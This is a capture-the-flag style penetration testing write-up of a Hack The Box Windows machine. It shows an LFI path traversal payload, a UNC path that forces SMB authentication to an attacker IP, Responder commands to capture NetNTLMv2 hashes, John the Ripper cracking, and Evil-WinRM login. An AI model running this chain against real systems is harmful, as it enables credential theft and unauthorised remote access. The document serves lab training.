Penetration Testing Report: 
•	LFI to WinRM Access via NetNTLMv2 Exploitation

Author: Shelby Adede  
Date:  2nd August 2025  
Target: HTB Machine (IP: 10.x.x.x)  
Objective: 54Exploit Local File Inclusion (LFI) vulnerability leading to Remote Code Execution via WinRM access.
 Initial Reconnaissance
 Nmap Scan Results
I performed an Nmap scan which revealed two open ports:
1.	**Port 80 (HTTP) - Running Apache Web Server  
2.	**Port 5985 (TCP)- Running  WinRM (Windows Remote Management)
OS Detection: Windows was identified as the underlying operating system.
 WinRM Overview
WinRM (Windows Remote Management) is a native Windows service that listens on TCP port 5985. It uses SOAP to allow remote execution and administration. With valid credentials, one can remotely execute commands and manage the host using PowerShell or other interfaces.
Web Enumeration
Opening the target in a browser with `http://<target-ip>` redirected us to:
http://unika.htb-
This confirmed the use of  Name-Based Virtual Hosting. The browser failed to resolve the domain name because it was not mapped to the correct IP locally. This was resolved by editing the `/etc/hosts` file:

10.x.x.x -  unika.htb
This entry allowed the browser to resolve unika.htb to the correct machine.
Vulnerability Identification: Local File Inclusion (LFI)
The web application includes pages dynamically using parameters such as ?page=. Improper sanitization of input leads to LFI vulnerability, which allows path traversal using:
../../../../windows/system32/drivers/etc/hosts
LFI is dangerous as it may allow reading sensitive local files. In some cases (such as on misconfigured systems), it may also lead to Remote Code Execution.
Exploiting LFI via Remote File Inclusion (RFI) with Responder
On Windows systems, we can exploit this LFI to force the server to authenticate to our machine using SMB. By including a remote path like:
//10.10.14.6/somefile
The server attempts to access this remote location via SMB, initiating an authentication request.
Capturing NetNTLMv2 Hashes
Using Responder, we set up a fake SMB server on our attacker machine.

1.	sudo git clone https://github.com/lgandx/Responder
2.	Navigate to the directory: cd Responder
3.	sudo python3 Responder.py -I <your_interface>
Once Responder is active, trigger the LFI with the remote path to make the Windows host try to authenticate.
Responder will capture the NetNTLMv2 hash during this process.
Cracking NetNTLMv2 with John the Ripper
•	Save the captured hash in a file:
•	Use the appropriate format and wordlist to crack it:
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
•	If successful, John will display the cracked password.

Remote Access via Evil-WinRM
•	With valid credentials obtained from hash cracking, access the system using Evil-WinRM:
Evil-winrm -i 10.x.x.x -u <username> -p <password>
•	This provides a remote PowerShell session on the victim machine.

	Vulnerability: LFI with potential for RFI via SMB.
	Exploitation: Forced authentication captured with Responder.
	Cracked Credentials: Recovered NetNTLMv2 hash.
Access Gained: WinRM shell access using Evil-WinRM.

Notes and Observations
1)	The web server’s use of virtual hosts was key in enumeration.
2)	The vulnerability was severe enough to escalate from file read to full system compromise.
3)	Demonstrates a realistic attack chain: LFI → NetNTLMv2 Capture → Hash Cracking → WinRM Access.







